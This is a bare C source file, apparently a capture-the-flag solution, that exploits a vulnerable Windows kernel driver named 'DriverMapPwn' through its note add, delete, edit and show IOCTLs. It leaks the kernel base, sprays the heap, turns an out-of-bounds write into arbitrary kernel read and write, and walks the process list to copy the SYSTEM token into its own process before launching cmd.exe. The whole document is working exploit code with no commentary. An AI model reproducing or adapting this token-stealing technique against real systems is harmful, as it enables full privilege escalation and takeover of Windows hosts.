# Windows

```c
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <string.h>
#include <process.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib,"ntdll.lib")
#define SIOCTL_TYPE 40000

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

#define SystemModuleInformation ((SYSTEM_INFORMATION_CLASS)11)

BOOLEAN GetKernelModuleBase(const char* Name, ULONG_PTR *lpBaseAddress) {
	PRTL_PROCESS_MODULES ModuleInformation = NULL;
	ULONG InformationSize = 16;
	NTSTATUS NtStatus;

	do {
		InformationSize *= 2;

		ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
		memset(ModuleInformation, 0, InformationSize);

		NtStatus = NtQuerySystemInformation(SystemModuleInformation,
			ModuleInformation,
			InformationSize,
			NULL);
	} while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(NtStatus)) {
		return FALSE;
	}

	BOOL Success = FALSE;
	for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
		CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
		CONST USHORT OffsetToFileName = Module->OffsetToFileName;

		if (!strcmp((const char *)&Module->FullPathName[OffsetToFileName], Name)) {
			*lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;
			Success = TRUE;
			break;
		}
	}

	free(ModuleInformation);
	return Success;
}

#define IOCTL_NEW 		( 0x221803 )
#define IOCTL_DELETE    ( 0x221803 + 4 )
#define IOCTL_EDIT      ( 0x221803 + 8 )
#define IOCTL_SHOW      ( 0x221803 + 12 )

HANDLE hDevice;
int addNote(unsigned int index, unsigned int size) {
	unsigned int arg[2] = { size,index };
	unsigned int arg2[2] = { };
	int bResult = DeviceIoControl(hDevice, IOCTL_NEW, arg, 8, arg2, 8, NULL, NULL);
	//printf("[+] ADD 0x%lx at 0x%lx: %d\n", size, index, bResult);
	return bResult;
}

int delNote(unsigned int index) {
	unsigned int arg[2] = { index };
	unsigned int arg2[2] = { index };
	int bResult = DeviceIoControl(hDevice, IOCTL_DELETE, arg, 8, arg2, 8, NULL, NULL);
	//sprintf("[+] Delete at 0x%lx: %d\n", index, bResult);
	return bResult;
}

int editNote(unsigned int index, unsigned int offset, unsigned long long value) {
	unsigned long long tmp = value >> 32;
	unsigned int arg[4] = { index,offset,value & 0xFFFFFFFF,tmp & 0xFFFFFFFF };
	unsigned int arg2[2] = { index };
	int bResult = DeviceIoControl(hDevice, IOCTL_EDIT, arg, 0x10, arg2, 8, NULL, NULL);
	//printf("[+] editNote at 0x%lx: %d\n", index, bResult);
	return bResult;
}

unsigned long long showNote(unsigned int index, unsigned int offset) {
	unsigned int arg[2] = { index,offset };
	unsigned long long result;
	int bResult = DeviceIoControl(hDevice, IOCTL_SHOW, arg, 0x10, &result, 8, NULL, NULL);
	//printf("[+] showNote at  0x%lx: %d\n", index, bResult);
	return result;
}

int main()
{

	LoadLibrary(L"user32.dll");
	ULONG_PTR Nt_Addr = 0;
	GetKernelModuleBase("ntoskrnl.exe", &Nt_Addr);

	setvbuf(stdout, NULL, _IONBF, 0);
	NTSTATUS status;

	hDevice = CreateFileW(L"\\\\.\\DriverMapPwn",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	// Heap Spray
	for (int i = 0; i < 0x200; i++) {
		delNote(i);
	}
	for (int i = 0; i < 0x200; i++) {
		addNote(i, 0x2000);
	}


	int magicIndex = -1;
	for (int j = 0x80; j < 0x2000 / 8; j++) {
		unsigned long long tmp = showNote(0x1e0, 0x8000 + j);
		if (tmp == 0x2000) {
			magicIndex = j;
			break;
		}
	}
	unsigned long long modifiedIndex = showNote(0x1e0, 0x8000 + magicIndex - 1);

#define PsInitialSystemProcess_OFFSET                 0xcfc420

	magicIndex = 0x8000 + magicIndex + 1;
	editNote(0x1e0, magicIndex, Nt_Addr + 0xcfc420);
	unsigned long long sysEprocess = showNote(modifiedIndex, 0);

	editNote(0x1e0, magicIndex, sysEprocess + 0x4b8);
	unsigned long long systemToken = showNote(modifiedIndex, 0); //PsInitialSystemProcess

	unsigned long long currentPID = GetCurrentProcessId();

	unsigned long long curEprocess = 0;
	unsigned long long tmpPoint = sysEprocess;

	while (curEprocess == 0) {
		unsigned long long tmpPID;
		editNote(0x1e0, magicIndex, tmpPoint + 0x448 + 8);
		tmpPoint = showNote(modifiedIndex, 0) - 0x448; // ActiveProcessLinks
		editNote(0x1e0, magicIndex, tmpPoint + 0x440);
		tmpPID = showNote(modifiedIndex, 0); // UniqueProcessId
		if (tmpPID == currentPID)
			curEprocess = tmpPoint;
	}

	editNote(0x1e0, magicIndex, curEprocess + 0x4b8);
	editNote(modifiedIndex, 0, systemToken);
	system("cmd.exe");
}
```